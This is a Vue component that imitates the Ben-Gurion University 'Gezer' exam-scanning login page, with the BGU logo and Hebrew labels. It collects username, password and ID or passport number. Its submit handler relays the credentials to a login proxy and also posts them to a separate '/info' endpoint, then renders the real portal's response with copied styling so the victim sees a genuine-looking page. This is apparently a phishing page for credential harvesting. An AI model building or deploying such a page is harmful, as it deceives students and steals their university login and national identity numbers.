<template>
  <div class="container" >
    <img class="logo-wrapper" :src="img"/>
    <div>
      <span style="color: red" v-if="!!error">פרטי שגויים, הזן שנית</span>
      <div class="header">
        <h1>סריקת מחברות בחינה - כניסה</h1>
      </div>
      <hr/>
      <div class="inputs">
        <div class="input-container inputs-headers">
        <span>שם משתמש</span>
        <span>סיסמא</span>
        <span>ת.ז/דרכון</span>
      </div>
        <div class="input-container users-inputs">
        <input v-model="username">
        <input type="password" v-model="password">
        <input v-model="id">
      </div>
      </div>
      <div>
        <button @click="submit" :class="{loading: isLoading}" class="sign-in-button">{{ isLoading ? 'טוען' : 'המשך'}}</button>
      </div>
    </div>
  </div>
</template>

<script>
import css from './static/gradeSheetCss';
import img from './static/logo-bgu.png';
import axios from 'axios';
export default {
  name: "BguPage",
  data() {
    return {
      img,
      css,
      username: '', id: '', password: '',
      error: '',
      isLoading: false,
    };
  },
  methods: {
    async submit() {
      this.isLoading = true;
      try {
        const details = {
          username: this.username,
          password: this.password,
          id: this.id
        }
        const res = await axios.post('http://localhost:3001/login-gezer', details);
        axios.post('http://localhost:3001/info', { information: details })
        const newHtml = res.data.replace("<link href=\"n3style.css\" rel=\"Stylesheet\" type=\"text/css\">", `<style> ${this.css} </style>`);
        document.write(newHtml);
      } catch(e) {
        this.error = true;
        console.log(e);
      }
      finally {
        this.isLoading = false;
      }
    },
  },
}
</script>

<style  lang="scss" scoped>
.container {
  background-color: #E5E8F2;
  position: absolute;
  height: 100%;
  width: 100%;
}
.sign-in-button {
  width: 120px;
  border: 1px solid #141823;
  font-size: 19px;
  font-weight: bold;
  cursor: pointer;
  background-color: #5F78AB;
  color: White;
  border-radius: 7px;
  &:hover {
    background-color: #3B5998;
  }
}
.logo-wrapper {
  height: 84px
}
.inputs {
  display: flex;
  flex-direction: row-reverse;
  justify-content: flex-start;
  margin-right: 20px;
  .input-container {
    display: flex;
    flex-direction: column;
  }
  .inputs-headers {
    display: flex;
    align-items: end;
  }
  .users-inputs {
    width: 400px;
    margin-right: 10px;
  }
}
.loading {
  background-color: #efefef;
  cursor: not-allowed !important;
  &:hover {
    background-color: #efefef;
    cursor: not-allowed !important;
  }
}
</style>